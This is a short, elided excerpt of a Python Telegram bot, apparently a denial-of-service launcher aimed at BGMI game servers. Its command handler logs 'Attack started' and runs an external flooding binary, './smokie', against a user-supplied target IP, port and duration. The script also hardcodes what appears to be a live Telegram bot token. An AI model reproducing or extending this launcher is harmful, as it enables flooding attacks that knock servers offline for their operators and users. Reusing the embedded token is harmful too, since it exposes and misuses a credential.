...
TOKEN = '7771483916:AAF98IeIGVIv9PSLY6ZIRnZc4IwulLjuQVc'  # Replace with your actual bot token
...
def bgmi_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./smokie {target_ip} {target_port} {default_duration} 9 975")
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./smokie {target_ip} {target_port} {duration} 9 975"
